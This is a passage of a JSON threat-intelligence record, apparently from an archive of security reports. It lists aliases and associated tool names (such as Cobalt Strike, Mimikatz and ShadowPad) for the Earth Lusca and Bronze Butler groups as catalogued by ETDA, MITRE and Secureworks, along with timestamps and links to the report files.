                "Bronze University",
                "Charcoal Typhoon",
                "Chromium",
                "Red Dev 10",
                "Red Scylla"
            ],
            "source_name": "ETDA:Earth Lusca",
            "tools": [
                "Agentemis",
                "AntSword",
                "BIOPASS",
                "BIOPASS RAT",
                "BadPotato",
                "Behinder",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "Doraemon",
                "FRP",
                "Fast Reverse Proxy",
                "FunnySwitch",
                "HUC Port Banner Scanner",
                "KTLVdoor",
                "Mimikatz",
                "NBTscan",
                "POISONPLUG.SHADOW",
                "PipeMon",
                "RbDoor",
                "RibDoor",
                "RouterGod",
                "SAMRID",
                "ShadowPad Winnti",
                "SprySOCKS",
                "WinRAR",
                "Winnti",
                "XShellGhost",
                "cobeacon",
                "fscan",
                "lcx",
                "nbtscan"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "d53593c3-2819-4af3-bf16-0c39edc64920",
            "created_at": "2022-10-27T08:27:13.212301Z",
            "updated_at": "2025-03-27T02:00:55.529662Z",
            "deleted_at": null,
            "main_name": "Earth Lusca",
            "aliases": [
                "Earth Lusca",
                "TAG-22",
                "Charcoal Typhoon",
                "CHROMIUM",
                "ControlX"
            ],
            "source_name": "MITRE:Earth Lusca",
            "tools": [
                "Mimikatz",
                "PowerSploit",
                "Tasklist",
                "certutil",
                "Cobalt Strike",
                "Winnti for Linux",
                "Nltest",
                "NBTscan",
                "ShadowPad"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "d4e7cd9a-2290-4f89-a645-85b9a46d004b",
            "created_at": "2022-10-25T16:07:23.419513Z",
            "updated_at": "2025-03-27T02:02:09.790389Z",
            "deleted_at": null,
            "main_name": "Bronze Butler",
            "aliases": [
                "Bronze Butler",
                "CTG-2006",
                "Operation ENDTRADE",
                "RedBaldNight",
                "Stalker Panda",
                "Stalker Taurus",
                "TEMP.Tick",
                "Tick"
            ],
            "source_name": "ETDA:Bronze Butler",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "9002 RAT",
                "AngryRebel",
                "Blogspot",
                "Daserf",
                "Datper",
                "Elirks",
                "Farfli",
                "Gh0st RAT",
                "Ghost RAT",
                "HOMEUNIX",
                "HidraQ",
                "HomamDownloader",
                "Homux",
                "Hydraq",
                "Lilith",
                "Lilith RAT",
                "McRAT",
                "MdmBot",
                "Mimikatz",
                "Minzen",
                "Moudour",
                "Muirim",
                "Mydoor",
                "Nioupale",
                "PCRat",
                "POISONPLUG.SHADOW",
                "Roarur",
                "RoyalRoad",
                "ShadowPad Winnti",
                "ShadowWali",
                "ShadowWalker",
                "SymonLoader",
                "WCE",
                "Wali",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "XShellGhost",
                "XXMM",
                "gsecdump",
                "rarstar"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "bf0489c5-1c07-41e6-91c9-855ad96ccc6a",
            "created_at": "2022-10-25T16:47:55.541639Z",
            "updated_at": "2025-03-27T02:05:17.253496Z",
            "deleted_at": null,
            "main_name": "BRONZE BUTLER",
            "aliases": [
                "Daserf",
                "Stalker Panda ",
                "Tick ",
                "CTG-2006 "
            ],
            "source_name": "Secureworks:BRONZE BUTLER",
            "tools": [
                " DGet",
                " Daserf",
                " Datper",
                " Gofarer",
                " MSGet",
                " Mimikatz",
                " RarStar",
                " Screen Capture Tool",
                " ShadowPad",
                " T-SMB",
                " WinRAR",
                " Windows Credential Editor",
                " gsecdump",
                " xmm downloader",
                " xxmm",
                "ABK"
            ],
            "source_id": "Secureworks",
            "reports": null
        }
    ],
    "ts_created_at": 1673536150,
    "ts_updated_at": 1743041735,
    "ts_creation_date": 1672273198,
    "ts_modification_date": 1672273198,
    "files": {
        "pdf": "https://archive.orkl.eu/05c2bc9fa757a36123fa380da57367a12030a4e9.pdf",
        "text": "https://archive.orkl.eu/05c2bc9fa757a36123fa380da57367a12030a4e9.txt",
        "img": "https://archive.orkl.eu/05c2bc9fa757a36123fa380da57367a12030a4e9.jpg"
    }
}